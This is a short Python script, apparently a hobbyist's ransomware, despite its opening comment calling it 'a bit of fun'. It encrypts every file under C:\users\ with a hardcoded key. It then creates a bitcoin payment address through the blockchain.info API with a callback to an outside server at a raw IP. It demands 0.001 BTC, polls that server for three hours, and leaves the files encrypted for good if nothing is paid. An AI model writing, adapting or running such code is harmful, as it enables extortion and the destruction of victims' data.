#just to add this is just a bit of fun, i would not consider using this.

import random
import time
import json
import encryptionManager
import requests


rootDirectionary = 'C:\\users\\'#everything in this directory will be encrypted
key = "0c92c4e1a35551ed366ca52bf12b6037"  #str(random.getrandbits(32)) < this doesnt work
#I cant find a way to generate a 16 byte key, in python. So im using this for now



password = raw_input("Oh god dont do this accidentally, whats the password: ")  #@UndefinedVariable this is here to make sure that 
#I dont accidently start this on my own computer

if password != "basil":
    exit()


filesChanged = encryptionManager.manage(0, rootDirectionary, key)#encrypts the files
             




        
"""
You can put anything you want here. For example you could create a bitcoin wallet with an API,
and decrypt the files once an amount of bitcoins has been transfered to it. 

"""
#these are paramaters for the creation of a bitcoin wallet, using the blockchain api
params = {
          "method": "create",
          "address": "1QHjy2cUAWbd5S1ZLtD7EsXYtHQ4g6VM9U",#this is the address that any bitcoin sent to the newly created address will be sent to.
          "callback": "http://79.170.40.237/bot.com/code/bitcoinManager.php"#when bitcoin is sent to the address get request will be sent a server (mine)
          #the server should take note of this in its database
          }

response = requests.get("http://blockchain.info/api/receive", params=params)#submits the API

jsonResponse = response.json()#encodes the response in JSON
print("Send 0.001btc to "+ jsonResponse["input_address"])
time.sleep(3)
print("You have three hours to send the bitcoin")
payload = {
           "address": jsonResponse["input_address"]#creates a request so that my server can check if money has been sent to that particular address
           
           }
for i in range(108):
    time.sleep(100)#100 * 108 is 10800, which is 3 hours in seconds. The reason there is a sleep is so my own server doesnt get DDOSed
    responsePaid = requests.get("http://79.170.40.237/bot.com/code/checker.php", params=payload)#sends a request to my server to see if BTC has been sent
    
    jsonPaid = responsePaid.json()
    
    if jsonPaid["paid"] == 1:#if btc has been paid my server should respond with a 1 in the paid JSON. 
        encryptionManager.manage(1, rootDirectionary, key) #decypts the files.
        break
    else:
        print("Nothing paid yet")    


exit()#when the 3 hours are up the program ends and the key to decrypting the files is lost. So the files are lost.        
        
        